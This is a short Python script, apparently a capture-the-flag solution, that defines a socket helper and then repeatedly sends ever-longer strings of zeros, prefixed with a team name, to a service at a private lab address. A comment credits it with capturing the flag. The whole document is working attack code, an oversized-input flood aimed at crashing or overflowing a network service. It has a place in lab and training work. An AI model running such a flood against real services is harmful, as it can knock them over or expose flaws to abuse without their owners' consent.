import socket
import re
import time


def netcat(ip, port, message, timeout=10):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.sendall((message + "\n").encode())
        response = b""
        while True:
            data = s.recv(4096)
            if not data:
                break
            response += data
        s.close()
        return response.decode()
    except Exception as e:
        return f"Error: {e}"

# Below is what captured the flag lmao 

maxchars = 10000000000
string = ""
while len(string) < maxchars:
    ptr = 0
    while ptr < 10000:
        string += "0"
        ptr +=1
    time.sleep(0.025)
    nc = netcat("10.100.52.65", 3400,"GroupG14 " + string)
    print("len : " + str(len(string)) + " " + nc)

